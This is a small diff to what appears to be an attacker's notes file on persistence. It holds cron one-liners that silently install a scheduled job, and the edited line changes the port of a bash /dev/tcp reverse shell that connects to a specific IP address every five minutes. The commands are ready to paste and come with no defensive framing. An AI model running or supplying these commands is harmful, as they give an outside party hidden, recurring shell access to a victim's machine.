@@ -10,4 +10,4 @@
 (crontab -l > .tab ; echo "* * * * * reverse-shell-of-choice" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
 
 # example sending bash reverse shell every 5 min
-(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/154.49.137.21/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
+(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/154.49.137.21/1336 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
